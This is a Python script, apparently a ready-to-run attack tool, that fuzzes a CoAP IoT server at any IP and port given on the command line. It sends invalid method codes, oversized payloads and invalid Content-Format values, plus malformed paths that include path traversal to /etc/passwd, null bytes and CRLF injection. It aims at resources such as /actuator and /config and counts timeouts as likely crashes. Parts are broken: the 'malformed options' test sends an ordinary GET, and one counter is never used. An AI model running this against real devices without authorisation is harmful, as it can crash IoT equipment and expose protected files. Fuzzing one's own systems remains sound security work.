#!/usr/bin/env python3
"""
CoAP Response Code Fuzzing Attack
"""

import asyncio
import sys
import time
from aiocoap import *
from aiocoap.numbers import codes
import random

attack_stats = {
    'tests_executed': 0,
    'errors_triggered': 0,
    'anomalies_detected': 0,
    'crashes_suspected': 0
}

class CoAPFuzzer:
    def __init__(self, target_host, target_port):
        self.target = f"coap://{target_host}:{target_port}"
        self.target_host = target_host
        self.target_port = target_port
    
    async def fuzz_method_codes(self, resource):
        """Fuzzes method codes."""
        
        print("\nFuzzing: invalid method codes")
        

        invalid_codes = [0, 5, 6, 7, 8, 15, 31, 255]
        
        for code_value in invalid_codes:
            try:
                protocol = await Context.create_client_context()
                uri = f"{self.target}{resource}"
                
                request = Message(code=code_value, uri=uri)
                
                response = await asyncio.wait_for(
                    protocol.request(request).response,
                    timeout=2.0
                )
                
                print(f"Code {code_value}: Response={response.code}")
                attack_stats['tests_executed'] += 1
                
            except asyncio.TimeoutError:
                print(f"Code {code_value}: TIMEOUT (possible crash?)")
                attack_stats['crashes_suspected'] += 1
            except Exception as e:
                print(f"Code {code_value}: ERROR - {type(e).__name__}")
                attack_stats['errors_triggered'] += 1
    
    async def fuzz_options(self, resource):
        """Fuzzes CoAP options."""
        
        print("\nFuzzing: malformed options")
        
        try:
            protocol = await Context.create_client_context()
            uri = f"{self.target}{resource}"
            
            request = Message(code=GET, uri=uri)
            
            response = await protocol.request(request).response
            attack_stats['tests_executed'] += 1
            
        except Exception as e:
            attack_stats['errors_triggered'] += 1
            print(f"Invalid option triggered an error: {e}")
    
    async def fuzz_uri_paths(self):
        """Fuzzing de URI paths"""
        
        print("\nFuzzing: URI paths malformados")
        
        malformed_uris = [
            "/../../../etc/passwd",
            "/." * 100,
            "/" + "A" * 10000,
            "/\x00\x00\x00",
            "/%00%00%00",
            "/%2e%2e%2f" * 10,
            "/\r\n\r\n",
            "/" + "é" * 500,
        ]
        
        for uri_path in malformed_uris:
            try:
                protocol = await Context.create_client_context()
                uri = f"coap://{self.target_host}:{self.target_port}{uri_path}"
                
                request = Message(code=GET, uri=uri)
                
                response = await asyncio.wait_for(
                    protocol.request(request).response,
                    timeout=2.0
                )
                
                print(f"URI fuzzing: {response.code}")
                attack_stats['tests_executed'] += 1
                
            except asyncio.TimeoutError:
                print(f"URI '{uri_path[:30]}...' causou TIMEOUT")
                attack_stats['crashes_suspected'] += 1
            except Exception as e:
                attack_stats['errors_triggered'] += 1
    
    async def fuzz_payload_sizes(self, resource):
        """Fuzzing de tamanhos de payload"""
        
        print("\nFuzzing: Tamanhos extremos de payload")
        
        payload_sizes = [0, 1, 2, 1023, 1024, 1025, 65535, 100000]
        
        for size in payload_sizes:
            try:
                protocol = await Context.create_client_context()
                uri = f"{self.target}{resource}"
                
                payload = b"X" * size
                request = Message(code=PUT, uri=uri, payload=payload)
                
                response = await asyncio.wait_for(
                    protocol.request(request).response,
                    timeout=3.0
                )
                
                print(f"Payload {size} bytes: {response.code}")
                attack_stats['tests_executed'] += 1
                
            except asyncio.TimeoutError:
                print(f"Payload {size} bytes causou TIMEOUT")
                attack_stats['crashes_suspected'] += 1
            except Exception as e:
                attack_stats['errors_triggered'] += 1
                if size > 10000:
                    print(f"Payload grande ({size}): {type(e).__name__}")
    
    async def fuzz_content_formats(self, resource):
        """Fuzzing de Content-Format"""
        
        print("\nFuzzing: invalid Content-Format values")
        
        # Reserved/invalid Content-Format values
        invalid_formats = [999, 65535, 12345, 0xFFFF]
        
        for fmt in invalid_formats:
            try:
                protocol = await Context.create_client_context()
                uri = f"{self.target}{resource}"
                
                request = Message(code=POST, uri=uri, payload=b"test data")
                request.opt.content_format = fmt
                
                response = await protocol.request(request).response
                
                print(f"Content-Format {fmt}: {response.code}")
                attack_stats['tests_executed'] += 1
                
            except Exception as e:
                attack_stats['errors_triggered'] += 1
    
    async def launch_fuzzing_campaign(self):
        """Launch the full fuzzing campaign."""
        
        resources = ["/api", "/sensor", "/actuator", "/config"]
        
        print("\nStarting CoAP Fuzzing Campaign...\n")
        
        for resource in resources:
            await self.fuzz_method_codes(resource)
            await asyncio.sleep(1)
            
            await self.fuzz_options(resource)
            await asyncio.sleep(1)
            
            await self.fuzz_payload_sizes(resource)
            await asyncio.sleep(1)
            
            await self.fuzz_content_formats(resource)
            await asyncio.sleep(1)
        
        await self.fuzz_uri_paths()

        print(f"Testes executados: {attack_stats['tests_executed']}")
        print(f"Erros trigados: {attack_stats['errors_triggered']}")
        print(f"Crashes suspeitos: {attack_stats['crashes_suspected']}")
        print(f"Anomalias detectadas: {attack_stats['anomalies_detected']}")

async def main():
    if len(sys.argv) < 3:
        print("Uso: python3 attack.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])

    print(f"Target: {target_host}:{target_port}")
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    fuzzer = CoAPFuzzer(target_host, target_port)
    await fuzzer.launch_fuzzing_campaign()

if __name__ == "__main__":
    asyncio.run(main())
